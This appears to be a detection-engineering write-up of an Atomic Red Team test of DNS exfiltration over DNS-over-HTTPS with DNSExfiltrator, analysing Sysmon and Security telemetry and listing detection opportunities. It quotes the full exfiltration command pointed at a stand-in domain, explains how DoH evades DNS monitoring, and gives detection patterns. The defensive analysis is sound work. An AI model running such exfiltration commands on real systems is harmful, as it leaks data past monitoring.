# T1048-3: Exfiltration Over Alternative Protocol — DNSExfiltration (DoH)

## Technique Context

T1048 Exfiltration Over Alternative Protocol covers adversary use of protocols other than the primary C2 channel for data exfiltration. DNS exfiltration — encoding data into DNS query names — exploits the near-universal permission of DNS traffic in enterprise environments. DNS-over-HTTPS (DoH) adds a second layer of evasion by tunneling DNS queries through encrypted HTTPS connections to public resolvers such as Google (8.8.8.8 via `dns.google.com`) or Cloudflare, making the DNS queries indistinguishable from ordinary HTTPS traffic at the network perimeter.

The DNSExfiltrator tool (`dnsexfil.ps1`) is a purpose-built exfiltration framework that loads a target file, encodes it in chunks, and transmits each chunk as a DNS subdomain query to an attacker-controlled domain. With the `-doh google` flag, it routes these queries through Google's DoH service rather than the system DNS resolver, bypassing DNS monitoring solutions that only inspect traditional UDP/53 traffic. The `-p atomic` parameter is a password used to encrypt/encode the chunks, and `-t 500` sets a 500ms delay between queries.

Detection is challenging because DoH traffic blends with legitimate HTTPS to Google or Cloudflare. Effective approaches include monitoring for unusual volumes of HTTPS connections to DoH resolver IPs from endpoints, detecting the DNSExfiltrator PowerShell module by name or hash, and identifying PowerShell processes loading large files for base64 encoding followed by outbound HTTPS connections.

## What This Dataset Contains

With Defender disabled, DNSExfiltrator loaded and executed without interference. The telemetry documents the full exfiltration attempt with clear process execution evidence.

Security EID 4688 captures the child PowerShell process spawned with the complete exfiltration command: `"powershell.exe" & {Import-Module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1" Invoke-DNSExfiltrator -i "C:\AtomicRedTeam\atomics\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500}`. This reveals the target domain (`target.example.com`), the DoH provider (`google`), the inter-query delay (`500ms`), and the password (`atomic`). The input file `-i` is the dnsexfil.ps1 script itself — a self-referential test that exfiltrates the tool's own source code.

Sysmon EID 1 confirms the process creation with identical command line and parent context. Sysmon EID 11 captures two file creation events, including `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` — a PowerShell startup profile write consistent with a SYSTEM-context PowerShell session initializing its profile data. This file creation event is benign but documents the SYSTEM execution context.

The Application channel contains EID 15 (Defender status update), and the Sysmon EID breakdown confirms 22 EID 7 ImageLoad events, 4 EID 1, 4 EID 10, 3 EID 17, and 2 EID 11. No EID 3 network connection events or EID 22 DNS query events appear in the EID breakdown — this is the critical finding.

The absence of Sysmon EID 3 and EID 22 events is expected for the DoH technique: when DNSExfiltrator uses DoH, it makes HTTPS connections directly to Google's DoH endpoint (`8.8.8.8:443` or `dns.google.com:443`) rather than sending standard DNS queries through the Windows resolver. Sysmon EID 22 only captures DNS queries routed through the Windows DNS client; DoH queries that bypass the resolver entirely are invisible to this telemetry source. Any EID 3 HTTPS connections to Google's infrastructure would be in the full event stream.

Compared to the defended dataset (30 Sysmon, 10 Security, 49 PowerShell), the undefended run shows more events across all channels (35 Sysmon, 4 Security, 112 PowerShell). The defended dataset noted that Defender didn't block this technique — both runs completed the DNSExfiltrator execution. The difference is that the undefended run generated more PowerShell script block logging, and the defended run had more Security events from Defender's process monitoring overhead.

## What This Dataset Does Not Contain

No Sysmon EID 3 network connection events appear for the DoH exfiltration traffic — the HTTPS connections to Google's DoH resolver exist in the network layer but are not captured in the sampled Sysmon events. The full event stream may contain EID 3 events showing connections to `8.8.8.8:443` or Google CDN IPs.

No traditional DNS query events (Sysmon EID 22) appear, which is the intended evasion effect of using DoH — the DNS resolution is performed inside HTTPS and never touches the Windows DNS client.

The exfiltrated data content (the dnsexfil.ps1 source code being transmitted) is not logged in any channel. Whether the exfiltration successfully reached an attacker server cannot be determined from endpoint telemetry alone.

## Assessment

This dataset is valuable for validating detections against DNSExfiltrator's process execution footprint. The Security EID 4688 command line is highly specific, containing the module name (`Invoke-DNSExfiltrator`), the DoH provider flag (`-doh google`), and the target domain. For detection engineers, this is the primary signal — the command line logging catches the tool invocation even when network-layer detections are ineffective against DoH.

The dataset demonstrates a genuine detection gap: DoH-based exfiltration produces minimal host-based network telemetry in standard Sysmon configurations. The tool executed, but without EID 22 or EID 3 evidence of the actual data transfer. Detection must rely on process execution indicators rather than network flow analysis for this technique variant.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 showing `powershell.exe` with `CommandLine` containing `Invoke-DNSExfiltrator` — this function name is specific to the DNSExfiltrator tool and has no legitimate use.

2. PowerShell EID 4104 script block events containing `Import-Module` with a path to `dnsexfil.ps1` or any DNS exfiltration tool — module import logging captures the tool loading even before execution begins.

3. `Import-Module` targeting a file in `C:\AtomicRedTeam\atomics\..\ ExternalPayloads\` — this path pattern is specific to ART testing, but real-world equivalents would be staging directories in `%TEMP%` or user profile paths.

4. Sysmon EID 3 connections from `powershell.exe` to known DoH resolver IPs (8.8.8.8, 8.8.4.4, 1.1.1.1, 1.0.0.1) on port 443 — legitimate PowerShell HTTPS connections to public DNS resolver IPs are unusual.

5. Network layer detection: high volume of HTTPS requests to DoH endpoints (`dns.google.com`, `cloudflare-dns.com`) from an endpoint process rather than the system resolver — DoH from a user process rather than the OS resolver is anomalous.

6. Sysmon EID 1 for `powershell.exe` where `CommandLine` contains both `-doh` and a domain parameter — the `-doh` flag is distinctive to DoH exfiltration tools.

7. PowerShell EID 4104 containing `Invoke-DNSExfiltrator` combined with parameters `-i` (input file), `-d` (domain), and `-p` (password) — the parameter set fingerprints this specific tool variant.
